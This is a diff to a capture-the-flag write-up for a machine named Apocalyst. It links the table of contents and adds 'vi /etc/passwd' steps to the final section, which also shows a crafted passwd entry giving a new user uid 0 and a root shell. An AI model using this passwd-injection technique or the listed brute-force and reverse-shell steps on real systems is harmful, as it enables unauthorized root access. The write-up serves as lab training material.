@@ -1,16 +1,16 @@
 #### Apocalyst
 
-- [Attacker Info]()
-- [Nmap Scan]()
-- [WPScan]()
-- [Gobuster]()
-- [Password List generation using cewl]()
-- [Gobuster with the cewl list]()
-- [steghide]()
-- [Bruteforce ``wp-login.php``]()
-- [Reverse Shell]()
-- [Privilege Escalation]()
-- [Gaining root using ``/etc/passwd``]()
+- [Attacker Info](#attacker-info)
+- [Nmap Scan](#nmap-scan)
+- [WPScan](#wpscan)
+- [Gobuster](#gobuster)
+- [Password List generation using cewl](#password-list-generation-using-cewl)
+- [Gobuster with the cewl list](#gobuster-with-the-cewl-list)
+- [steghide](#steghide)
+- [Bruteforce ``wp-login.php``](#bruteforce-wp-loginphp)
+- [Reverse Shell](#reverse-shell)
+- [Privilege Escalation](#privilege-escalation)
+- [Gaining root using ``/etc/passwd``](#gaining-root-using-etcpasswd)
 
 ###### Attacker Info
 
@@ -10546,6 +10546,10 @@ www-data@apocalyst:/dev/shm$
 
 ###### Gaining root using ``/etc/passwd``
 
+```sh
+vi /etc/passwd
+```
+
 ![](images/20.png)
 
 ```sh
@@ -10556,6 +10560,10 @@ root@kali:~/apocalyst/LinEnum#
 
 ```
 kan1shka:$1$kan1shka$WGn3QPw3pl6ORJGMuDmk7.:0:0:root:/root:/bin/bash
+```
+
+```sh
+vi /etc/passwd
 ```
 
 ![](images/21.png)
